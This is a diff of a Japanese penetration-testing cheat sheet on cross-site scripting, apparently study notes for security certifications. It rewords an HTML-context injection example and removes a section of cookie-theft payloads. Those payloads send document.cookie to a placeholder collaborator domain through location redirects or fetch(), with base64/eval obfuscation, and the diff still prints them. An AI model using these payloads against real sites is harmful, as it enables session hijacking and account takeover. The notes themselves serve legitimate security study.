@@ -91,14 +91,12 @@ eval(atob("<base64エンコードした上記ペイロード>"))
 > [!WARNING] 
 > HTMLタグ内にXSSペイロードを注入するとき、タグは `>` だけで閉じることができる。開発者ツールで注入後のcontextを確認し、文法を維持すること。
 
-**例：**
-
+検索機能を例にすると、検索した結果、以下のように表示されるとする
 ```html
-<h1>0 search results for 'ユーザの入力'</h1>
+<h1>0 search results for '<userinput>'</h1>
 ```
 
-に対して：
-
+これに対して、
 ```
 "><body onresize=print()>"
 ```
@@ -435,34 +433,6 @@ location = 'https://TARGET?<vuln_param>=<payload>'
 ---
 
 
----
-
-
-
-
-
-##### Cookie窃取用スクリプト基本形
-
-```
-alert(1)
-```
-	↓
-```
-document.location='https://COLLABORATOR_DOMAIN?c='+document.cookie;
-```
-	or
-```
-fetch('https://COLLABORATOR_DOMAIN?c='+document.cookie)
-```
-	or
-```
-eval(atob("base64エンコードした上記2つのペイロード"))
-```
-[Web攻撃の難読化](../../../OSCP/Cheatsheet/Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md#base64%20encoding)
-
----
-### 基本形
-
 ## HTMLタグ内でのXSS
 
 ##### 🚨：HTMLタグ内でのXSSペイロード注入時の注意点
@@ -475,8 +445,6 @@ eval(atob("base64エンコードした上記2つのペイロード"))
 ```
 "><body onresize=print()>"
 ```
-
-- [🔍 Recon](../../../BSCP/cheatsheet/🔍%20Recon.md#⭐️URLエンコードについて)
 
 ---
 ### HTMLタグ内のXSSメソドロジー
